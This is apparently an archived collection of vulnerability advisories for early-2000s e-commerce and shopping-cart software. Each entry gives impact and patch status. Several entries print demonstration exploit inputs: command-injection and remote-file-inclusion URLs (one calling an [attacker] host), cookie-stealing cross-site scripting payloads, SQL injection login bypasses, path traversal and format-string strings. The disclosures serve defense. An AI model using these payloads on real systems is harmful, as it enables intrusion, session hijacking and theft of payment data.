According to the report, all of the Xpressions products are affected, including trueConnect, FlowerLink, and eVision.

The vendor has reportedly been notified without response.
Impact': A remote user can gain administrative access on the application.  With this level of access, the remote user can view user passwords and credit card data.
Solution: No solution was available at the time of this entry.

Title: iisCART2000 Upload Authentication Error Lets Remote Users Upload and Execute Arbitrary Scripts
Impact: Execution of arbitrary code via network
Description:
An authentication vulnerability was reported in iisCART2000.  A remote user can upload and execute ASP scripts on the target server.
1ndonesian Security Team (1st) reported that the 'upload.asp' script does not check the calling user's privileges.  A remote user can upload an ASP script and then cause the script to be executed.  A remote user can exploit this to gain administrator privileges  on the application.

A demonstration exploit script is provided in the Source Message.

The vendor has reportedly been notified without response.
Impact': A remote user can execute arbitrary ASP scripts and gain admin access on the application.
Solution: No solution was available at the time of this entry.

Title: Webstores 2000 Input Validation Flaw Lets Remote Users Inject SQL Commands
Impact: Execution of arbitrary code via network
Description:
A vulnerability was reported in Webstores 2000.  A remote user can execute SQL commands on the target server to gain administrative access.
1ndonesian Security Team (1st) reported that the browse_item_details.asp script does not properly filter user supplied input.  A remote user can supply a specially crafted URL that injects SQL commands via the 'Item_ID' variable.  A remote user can exploit this to add arbitrary accounts to the system, including an administrator account.

A demonstration exploit script is provided in the Source Messsage.

The vendor has reportedly been notified without response.
Impact': A remote user can execute arbitrary SQL commands on the target server.
Solution: No solution was available at the time of this entry.

Title: (Vendor Strongly Disputes This Claim) Gator eWallet Discloses Credit Card Numbers and Passwords to Local Users and Other Information to Remote Users
Description:
Lorenzo Manuel Hernandez Garcia-Hierro of NovaPPC Security reported that the Gator eWallet discloses credit cards and passwords to local users.  In addition, the Gator Corporation backup servers disclose some user information to remote users.
[Editor's note:  The vendor strongly disputes the claims presented.

The vendor states that personal information entered by users into the Gator eWallet is stored only on the user's computer and is not backed up on any Gator servers and is never transmitted to or from any Gator servers.  The information stored on the user's computer is not Base64 encoded, but rather, is encrypted, according to the vendor.

The vendor indicates that the file names identified in the original report are related to Gator's advertising technology and do not contain user data.

We will work with the author of the original report and the vendor to resolve these issues and will update or delete this Alert accordingly.]

It is reported that Gator eWallet stores private information, potentially including credit card numbers and passwords,  on the target user's computer without encryption.  The software reportedly uses Base64 encoding instead of an encryption algorith.

The following files are used to store Gator eWallet information on the local system:

mepgh.dat
mepcme.dat
meprca.dat
 mepcmeft.dat
GMT.exe.manifest
meperr.dat
mepgus.dat
mepoem.dat
mepsnd-gs.dat
mepsnd-ksa.dat
mepcat.dat
sitehash4.dat

It is also reported that a remote user can retrieve arbitrary user data files from the Gator backup servers.

A demonstration exploit is provided:

GET /scripts/xx/xxY.com.ffz HTTP/1.0
Accept: */*
X-UA: WinInet 6.0.xxxx.1, 1.1, 1.0
If-Modified-Since: Thu, 06 Apr 2000 20:00:06 GMT
User-Agent: Gator/4.1 Script 0
SLRetries: 1
SL-LastServer: xx.gator.com
SL-LastErr: 12152
SL-LastErr: 12152
From: [SPOOFED USER /REQUEST ID]
Script-Version: 0.4
Product-Version: 4.1.2.5
SL-Version: 2
RunMode: 2
Host: xxbackup.gator.com
Connection: open

In the above demonstration, 'xx' is the first two characters of the domain user data file and 'Y' is the remaining characters in the domain.  The 'ffz' is the file extension of the script files used by backup server.

[Editor's note:  It is not clear exactly what kind of information can be retrieved from the backup servers.  We have asked for clarification and will update this alert with any new details.]

Additional information is provided (in Spanish language text) at:

http://security.novappc.com/gator-analisis
Impact':
A local user can view private personal information stored in the eWallet.

A remote user can obtain some data files for arbitrary users from the eWallet backup servers (operated by Gator Corporation).
Solution:
No solution was available at the time of this entry.

[Editor's note:  The vendor indicates that this report is inaccurate and that there is no disclosure of personal data.  See the 'Description' Section for details.]

Title: Happymall E-Commerce Input Validation Flaw Lets Remote Users Execute Arbitrary Commands
Impact: Execution of arbitrary code via network
Description:
Revin Aldi reported an input validation vulnerability in the Happymall e-commerce software.  Two scripts allow remote users to execute arbitrary commands with the privileges of the web server.
The 'normal_html.cgi' script does not filter user-supplied input before making an open() call based on that input.  A remote user can create a specially crafted URL to cause the system to execute arbitrary operating system commands.

A demonstration exploit is provided:

/shop/normal_html.cgi?file=|id|

/shop/normal_html.cgi? file=;id|

The vendor reports that the 'member_html.cgi' script is also affected.

The following is a timeline of events relevant to this vulnerability:

Apr 26, 2003 Reported to SecurityTracker
Apr 27, 2003 Vendor contacted (via English language e-mail, without response)
Apr 29, 2003 CERTCC-KR initially contacted
May  2, 2003 Details of vulnerability provided to vendor
May  3, 2003 CERTCC-KR Advisory published

Thanks to Revin Aldi for discovering and reporting the flaw, to CERTCC-KR for coordinating with the vendor, and to the vendor for quickly responding.
Impact': A remote user can execute arbitrary shell commands with the privileges of the target web server.
Solution:
The vendor has issued a patch, available at:

http://happymall.happycgi.com/forum/forum_detail.cgi?thread=353

The vendor has provided the following instructions for applying the patch to your system:

1. Extract zip file downloaded and you will get two files, member_html.cgi and normal_html.cgi.

2. Upload those files with ASCII mode to the web server in the directory containing index.cgi and overwrite.

3. Change the linked address
For example;
Before patch applied : http://test6.happycgi.com/normal_html.cgi?file=company.html
After patch applied : http://test6.happycgi.com/normal_html.cgi?file=company

Title: phPay Web Shopping Input Validation Flaws Disclose Information to Remote Users and Permit Cross-Site Scripting Attacks
Impact: Execution of arbitrary code via network
Description:
Several vulnerabilities were reported in the phPay web shopping software.  A remote user can determine the installation path as well as system information.  A remote user can conduct cross-site scripting attacks.
ALPER Research Labs reported the software does not filter HTML code from user-supplied input in the 'search.php' script.  A remote user can create a specially crafted URL that, when loaded by a target user, will cause arbitrary scripting code to be executed by the target user's browser. The code will originate from the site running the phPay software and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.  A demonstration exploit URL is provided:

http://[TARGET]/search.php?sess=your_session_id&lookfor=<script>alert
(document.cookie)</script>

It is also reported that a remote user can supply an invalid language code to cause the server to display the installation path.  A demonstration exploit URL is provided:

http://[TARGET]/login.php?sess=your_session_id&abt=&new_lang=99999&caller=navlang

Also, a remote user can specify a nonexistent configuration file in the 'start.php' script to determine the installation path.  A demonstration exploit URL is provided:

http://[TARGET]/start.php?config=alper.inc.php

The report also indicates that a remote user can obtain information about the site using the PHP siteinfo() function via the following [partial] URL:

/admin/phpinfo.php

Numerous other scripts also disclose the installation path to remote users, including:

/doc/addon-index.php, detail.php, fpass.php, header.inc.php, main.php, nav.php, pay.php, payed.php, publicpay.inc.php, reguser.php, search.php, server.php, view_cart.php, lib.inc.php, show_size.inc.php, limit.navi.inc.php, mailer.inc.php, show_cart.inc.php, stats.php, show_color.inc.php, show_content.inc.php, show_item_0.inc.php, show_item_1.inc.php, show_item_x.inc.php, show_item_2.inc.php, and others.
Impact':
A remote user can access the target user's cookies (including authentication cookies), if any, associated with the site running the phPay software, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.

A remote user can determine the installation path.

A remote user can determine information about the system.
Solution:
The vendor has released a fixed version (2.02.1), available at:

http://sourceforge.net/project/showfiles.php?group_id=39285

Title: WebC Shopping Cart Has Multiple Flaws That Allow Remote Users to Execute Arbitrary Code and Local Users to Gain Elevated Privileges
Impact: Execution of arbitrary code via local system
Execution of arbitrary code via network
Description:
Several vulnerabilities were reported in the WebC shopping cart software.  A remote user can execute arbitrary code on the system.  A local user can gain elevated privileges on the system.
It is reported that webc.cgi/webc.exe component contains buffer overflow, format string, and file handling vulnerabilities.

A remote user can reportedly pass a long script name to webc.cgi to trigger a buffer overflow and cause arbitrary code to be executed:

http://[target]/cgi-bin/webc.cgi/AAAAAAAAAAA ... ( ~ 550 A chars)

It is also reported that the software does not safely process certain configuration files.  A local user can create a symbolic link from a user-created file to the name of a webc.cgi configuration file in the current working directory.  The software will reportedly read the configuration file (symlinked to the user-created file) from the the current working directory.  If the configuration file enables process debugging, it is possible to trigger buffer overflows in the debugging section of the software and execute arbitrary code, according to the report.  A demonstration exploit is described in the Source Message.

It is also reported that the software contains various stack overflows that can be triggered by a local user to execute arbitrary code with elevated privileges.  The report states that if WebC is installed with set user id (setuid) root privileges, it can change its effected UID to a user-specified value (but not to "root") as set in the PATH_INFO environment variable.  If debugging is enabled, the software will copy each environment variable onto the stack without performing bounds checking.  This allows the local user to cause arbitrary code to be executed with the privileges of any non-root user on the system.  If WebC is installed with the privileges of a specific user (instead of setuid root), the arbitrary code will run with the privileges of that specific user.

A local user may be able to obtain root group privileges in certain cases where webc.cgi has the set group id (setgid) bit set.

Finally, a format string vulnerability was reported.  A local user can cause WebC to read a specially crafted 'webc.emf' file (used to store error messages) from the current working directory.  If the file contains lines with format characters, the local user can cause arbitrary code to be executed.

A demonstration exploit example is provided:

020052%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x. + 449 NULLs
Impact': A remote user can execute arbitrary code on the system with the privileges of the web server.  A local user can execute arbitrary code with the privileges of any non-root user on the system.  A local user may be able to execute arbitrary code with root group privileges, in certain configurations.
Solution:
The vendor has released a fixed version (5.020), available at:

ftp://ftp.automatedshops.com/pub/webc/5.020

Title: osCommerce Input Validation Flaws Allow Remote Users to Access the Application and Deny Service
Description:
Lorenzo Hernandez Garcia-Hierro reported a vulnerability in osCommerce.  A remote user can gain access to the application and can also cause denial of service conditions.
It is reported that a remote user can spoof the HTTP Referer field to gain access to the system using the following type of URL:

http://[target]/oscommerce_installation/default.php/cPath/[here comes your directory , use slashes and doble dots]

It is also reported that a remote user can request a non-existant product ID to cause the server to become unstable.  A demonstration URL is provided: 

product_info.php?products_id=[here comes your random content , better large]

A similar flaw reportedly exists with other variables supplied to 'product_info.php'.
Impact': A remote user can login to the system without authentication credentials.  A remote user can cause the service to become unstable.
Solution: No vendor solution was available at the time of this entry.  The author of the report has provided an unofficial solution, available in the Source Message.

Title: osCommerce Input Validation Flaws Allow Remote Users to Conduct Cross-Site Scripting Attacks
Impact: Execution of arbitrary code via network
Version(s): Prior to March 14, 2003; 2.2ms1 and prior versions
Description:
An input validation vulnerability was reported in osCommerce.  A remote user can conduct cross-site scripting attacks to steal a target user's cookies and hijack their session.
iProyectos issued a security advisory warning of several components that do not properly filter user-supplied input.  A remote user can create a specially crafted URL that, when loaded by a target user, will cause arbitrary scripting code to be executed by the target user's browser. The code will originate from the site running osCommerce and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user. 

A demonstration exploit URL is provided:

http://[target]/default.php?error_message=%3Cscript%20language=javascript%3Ewindow.alert%28document.cookie%29;%3C/script%3E

The 'info_message' variable is also affected in several scripts.

User-supplied comments inserted at the end of an order are also not filtered and can be viewed via 'account_history_info.php' and via 'checkout_confirmation.php'.

User-supplied information may be displayed by 'checkout_payment.php' if the order contains, for example, an invalid credit card number.

The report indicates that, as of March 18, 2003, the latest milestone available (2.2ms1) was vulnerable.
Impact': A remote user can access the target user's cookies (including authentication cookies), if any, associated with the site running osCommerce, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.
Solution:
The vendor has reportedly issued a fixed version, available via CVS:

http://www.oscommerce.com/downloads/snapshot

Title: 'Business::OnlinePayment::WorldPay::Junior' Commerce Module Input Verification Flaw May Let Remote Users Modify Commerce Pricing and Ordering Data
Description:
A vulnerability was reported in the Business::OnlinePayment::WorldPay::Junior payment management Perl module.  A remote user could modify ordering or pricing information.
It is reported that the module fails to properly validate user-supplied data to ensure that the data matches the transaction information returned from WorldPay via the callback facility.  A remote user could modify an HTML form to include alternate pricing data or ordering information.
Impact': A remote user could modify ordering or pricing information on a commerce system that uses the vulnerable module.
Solution:
The vendor has released a fixed version (1.05), available at:

http://search.cpan.org/author/CLIFFORDJ/Business-OnlinePayment-WorldPay-Junior-1.05/
http://search.cpan.org/CPAN/authors/id/C/CL/CLIFFORDJ/Business-OnlinePayment-WorldPay-Junior-1.05.tar.gz

Title: gtcatalog Include File Bug Lets Remote Users Execute Arbitrary Commands and Access Control Bug Discloses the Administrator Password
Impact: Execution of arbitrary code via network
Description:
An include file vulnerability was reported in the 'gtcatalog' catalog management system.  A remote user can execute arbitrary commands on the target server.  A remote user can also obtain the administrator's password.
Frog-m@n reported that a remote user can download the 'password.inc' include file, which contains the administrator password in the $$globalpw variable.

It is also reported that the index.php file includes the '*.custom.inc' include file relative to the '$custom' path variable, but does not validate that the appropriate file is included.  Furthermore, the $custom variable is not be defined in index.php.  A remote user can specify a remote location for a '*.custom.inc' include file to cause the target server to include the remotely located file and execute the file.

For example, the following URL can be used to execute the http://[attacker]/1.custom.inc file:

http://[target]/index.php?function=custom&custom=http://[attacker]/1
Impact': A remote user can obtain the administrator password.  A remote user can execute arbitrary PHP code and operating system commands on the target server with the privileges of the web server.
Solution:
No vendor solution was available at the time of this entry.  The author of the report has developed an unofficial patch, available at:

http://www.phpsecure.info/

Title: PhpMyShop SQL Injection Flaw Allows Remote Users to Gain Access to the System
Description:
A vulnerability was reported in PhpMyShop.  A remote user can login as another user on the system.
Frog-m@n reported that the 'compte.php' script does not properly filter user-supplied input.  A remote user can supply a URL with specially crafted values for the '$identifiant' and '$password' variables to be successfully authenticated by the system.  The values for these variables can cause a faulty SQL statement that determines authentication success to be incorrectly evaluated as 'TRUE', granting access.  The '$identifiant' value will determine which user account is accessed.

A demonstration exploit URL is provided:

http://[target]/compte.php?achat=1&valider=1&identifiant='%20OR%20''='&password='%20OR%20''='
Impact': A remote user can gain access to user accounts on the system.
Solution:
No vendor solution was available at the time of this entry.  The author of the report has released an unofficial patch, available at:

http://www.phpsecure.info/

Title: MYROOM Commerce Gallery Software May Disclose Files to Remote Users
Description:
A vulnerability was reported in the MYROOM gallery software.  A remote user can view certain files on the server that are not normally accessible via the web server.  A remote user may be able to obtain the underlying database username and password.
Frog-m@n reported that the 'room/save_item.php' file contains a flaw.  According to the report, when a file is uploaded, the system uses a predictable file name based on the date (YmdHis) and incorrectly allows the remote user to specify the file extension and then copies the uploaded file to the newly created target file name.

A remote user can copy an arbitrary file on the system to another file with an arbitrary file extension.  This allows the remote user to be able to read files on the system with the privileges of the web server.

A demonstration exploit URL to copy the file 'inc/conf.php', which contains the database username and password, to another file with a 'txt' extension:

http://[target]/room/save_item.php?name=hacked&ref=hacked&photo=../inc/conf.php&photo_type=ttxt

This will reportedly allow the specified file (inc/conf.php) to be viewed using the following type of URL (where the specific filename is based on the date):

http://[target]/img/photo/20030114015123.txt

It may be possible to upload an arbitrary PHP file and then cause the server to execute the uploaded file (however, this was not confirmed by testing).
Impact': A remote user can view certain files on the system with the privileges of the web server.  A remote user could view the underlying database username and password.
Solution:
No vendor solution was available at the time of this entry.  An unofficial patch is described in the Source Message and is available at:

http://www.phpsecure.info/

Title: a.shopKart Input Validation Flaw Permits SQL Command Injection and Discloses Shopping Database Information to Remote Users
Impact: Execution of arbitrary code via network
Description:
An input validation vulnerability was reported in the 'a.shopKart' ASP-based shopping cart software.  A remote user can view information in the shopping cart database.
Centaura Technologies Security Research Lab reported that a remote user can obtain information such as credit card numbers, addresses, and telephone numbers.

According to the report, the user-supplied "zip", "state", "country", "phone" and "fax" variables are not filtered.  A remote user can submit specially crafted values in these fields to cause arbitrary SQL commands to be executed on the underlying database.  It is reported that the addcustomer.asp, addprod.asp, and process.asp scripts and possibly other scripts are affected.

The vendor has reportedly been notified.
Impact': A remote user can execute commands on the SQL database and retrieve information from the shopping cart database.
Solution: No solution was available at the time of this entry.

Title: CartMan Shopping Cart Lets Remote Users Modify Prices of Items in Their Shopping Basket
Description:
An authentication vulnerability was reported in the CartMan shopping cart software.  A remote user can modify prices of items in their cart.
iDEFENSE reported that CartMan stores the prices of user-selected items in the URL and does not authenticate or validate the values. A remote user can supply a specially crafted URL to set their own price for an item in the shopping basket.

A demonstration exploit URL is provided:

cartman.php?action=add&id=1234&descr=My%20Product&price=1&quantity=1
Impact': A remote user can modify the prices of items added to their shopping cart.
Solution:
The vendor has reportedly described a temporary fix involving the use values stored in HTML forms.

[Editor's note:  Because a user can modify HTML form values as readily as URL parameter values, this 'temporary fix' would appear to fail to correct the problem, unless the fix also includes cryptographic signatures on the pricing data or server-side verification of pricing data.]

Title: ShopFactory Shopping Cart Lets Remote Users Modify the Prices of Items in Their Shopping Cart
Description:
A vulnerability was reported in the ShopFactory shopping cart system.  A remote authenticated user can modify the prices of items in their shopping cart.
Trust Factory warned that the contents of ShopFactory shopping carts, including prices, can be modified by the remote customer. A remote user can modify their cookies to change the prices of items in their shopping cart.  According to the report, the modified prices are maintained throughout the billing process.

It is reported that the system can be configured to store shopping information in a cookie on the remote user's browser.  This feature can reportedly be disabled by the web site administrator by setting the "Remember Shopping cart for (days)" to 0.  However, on some versions of the software (prior to 5.8), the server will accept user-created cookies even if the shop did not create the cookies.
Impact': A remote user can modify the prices of items in their shopping cart.
Solution:
No solution was available at the time of this entry.  According to the report, the vendor does not plan to fix the vulnerability (however, the vendor does plan to ensure that the server does not accept cookies if it is not configured to store shopping information in a cookie).

The author of the report recommends that you upgrade to at least version 5.8 of the ShopFactory software and set "Remember Shopping cart for (days)" to 0 to disable the storing of pricing information in user cookies.

Title: Cart32 Shopping Cart Server Trusts User-supplied Pricing Data
Description:
A vulnerability was reported in the Cart32 commerce server.  A remote authenticated user can modify prices when purchasing via the server.
It is reported that the Cart32 shopping cart server accepts and trusts product pricing supplied by the user via hidden HTML form fields.  A remote authenticated user can modify the price when shopping and submit the modified price to the server.

The vendor has reportedly been notified.
Impact': A remote authenticated user can modify prices when purchasing via a web site that users Cart32.  The price modifications are only valid for that particular purchasing session (i.e., the prices are not changed permanently on the server).
Solution: No solution was available at the time of this entry.

Title: JustAddCommerce Server Trusts User-supplied Pricing Data
Description:
A vulnerability was reported in the JustAddCommerce server.  A remote authenticated user can modify prices when purchasing via the server.
It is reported that the JustAddCommerce server accepts and trusts product pricing supplied by the user via hidden HTML form fields. A remote authenticated user can modify the price when shopping and submit the modified price to the server.

The vendor has reportedly been notified.
Impact': A remote authenticated user can modify prices when purchasing via a web site that users JustAddCommerce.  The price modifications are only valid for that particular purchasing session (i.e., the prices are not changed permanently on the server).
Solution: No solution was available at the time of this entry.

Title: MyMarket Shopping Cart Input Validation Error Lets Remote Users Conduct Cross-Site Scripting Attacks
Impact: Execution of arbitrary code via network
Description:
An input validation vulnerability was reported in MyMarket, a PHP-based shopping cart.  A remote user can conduct cross-site scripting attack to potentially gain access to user accounts on the cart system.
A remote user can create a specially crafted URL that, when loaded by a target user, will cause arbitrary scripting code to be executed by the target user's browser. The code will originate from the site running MyMarket and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.

A demonstration exploit URL is provided (with "i" replaced with "*"):

http://[traget]/templates/form_header.php?noticemsg=<Scr*ipt>javascript:alert(document.cookie)</Scr*ipt>

The vendor has reportedly been notified.
Impact': A remote user can access the target user's cookies (including authentication cookies), if any, associated with the site running MyMarket, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.
Solution:
No solution was available at the time of this entry.

The author of the report suggests the following as a solution:

"put this two lines at the begin of form_header.php"

---- form_header.php -----
<?
   $noticemsg = HTMLSpecialChars($noticemsg);
   $errormsg = HTMLSpecialChars($errormsg);
   ...
--------------------------

Title: (Vendor States That There is No Vulnerabilitiy) Re: Rich Media Technologies JustAddCommerce E-commerce Software Discloses User Passwords to Local Users
Description:
A vulnerability was reported in the Rich Media Technologies JustAddCommerce e-commerce addon for Dreamweaver and FrontPage, but the vendor has responded that there is no vulnerability.
In the original report, SecuriTeam reported that there was an information disclosure vulnerability in the JustAddCommerce shopping cart software. It was reported that the 'rtm.log' file contains customer IDs and passwords that are stored in plain text.

The vendor has responded that the observed behavior as reported by SecuriTeam was due to a test file being inadvertently present on the server and is *not* due to a vulnerability in the product or the product's configuration.  

According to the vendor, the 'RMT.LOG' file that was reported to contain usernames and passwords was only a temporary test file that is not part of the distribution version or the product itself.  The product apparently does not create log files that would reside on the web server front end.
Impact': It appears that this is not a vulnerability, so there is no impact.
Solution: It appears that this is not a vulnerability, so no solution is required.

Title: A-CART ASP-based Shopping Cart Discloses Database Contents to Remote Users
Description:
A default configuration access control vulnerability was reported in A-CART.  A remote user can view the database file.
SecurityFocus reported that the default configuration of the product stores the database file 'acart2_0.mdb' within the web directory. A remote user can simply download the database file via a HTTP request.

SecurityFocus credits Tacettin Karadeniz with reporting the bug, but makes no indication of where this bug was actually reported.
Impact': A remote user can view the shopping cart database file.
Solution: No solution was available at the time of this entry.

Title: (Debian Issues Fix) Interchange Commerce Server Discloses Files on the System to Remote Users
Description:
A vulnerability was reported in Red Hat's Interchange commerce system.  A remote user can view arbitrary files on the system.
It is reported that a remote user can supply a GET request containing '../' directory traversal characters to view any file on the system.

The vendor has reportedly been notified.
Impact': A remote user can view arbitrary files on the system.
Solution:
Debian has released a fix in version 4.8.3.20020306-1.woody.1 for the current stable distribution (woody) and in version 4.8.6-1 for the unstable distribution (sid).  The old stable distribution (potato) is not affected, because it doesn't ship the Interchange system.

Debian reports that the previous version of the package is vulnerable when Interchange runs in "INET mode" (internet domain socket).  This is reportedly not the default setting in Debian's distribution.
